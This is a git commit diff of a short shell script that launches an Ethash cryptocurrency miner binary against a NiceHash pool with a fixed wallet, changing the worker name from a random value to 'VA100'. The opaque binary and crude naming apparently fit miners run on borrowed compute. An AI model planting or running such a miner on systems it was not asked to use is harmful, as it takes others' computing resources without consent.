67326fbc952736fa1051b0dd7d22bd5707f0c91f
renilo <88342640+renilo@users.noreply.github.com>
2021-09-24 22:04:15 +0700

    Update kontol3.sh

--- kontol3.sh
+++ kontol3.sh
@@ -2,4 +2,4 @@ POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
 WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
 WORKER=$(echo $(shuf -i 1-9999999999 -n 1)-H)
 chmod +x memek
-./memek --algo ETHASH --pool $POOL --user $WALLET.$WORKER
+./memek --algo ETHASH --pool $POOL --user $WALLET.VA100
